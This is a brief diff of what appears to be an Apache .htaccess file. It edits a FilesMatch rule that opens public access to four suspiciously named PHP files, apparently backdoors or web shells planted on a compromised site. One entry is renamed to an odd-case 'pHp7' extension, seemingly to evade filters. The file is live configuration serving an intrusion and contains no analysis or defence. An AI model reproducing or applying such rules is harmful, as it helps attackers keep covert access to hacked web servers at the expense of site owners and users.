@@ -90,7 +90,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(xander-new-lock-geek.php|cicada.php|segs.php|dewe.php)$"># 
+<FilesMatch "^(xander-new-lock-geek.php|cicada.pHp7|segs.php|dewe.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
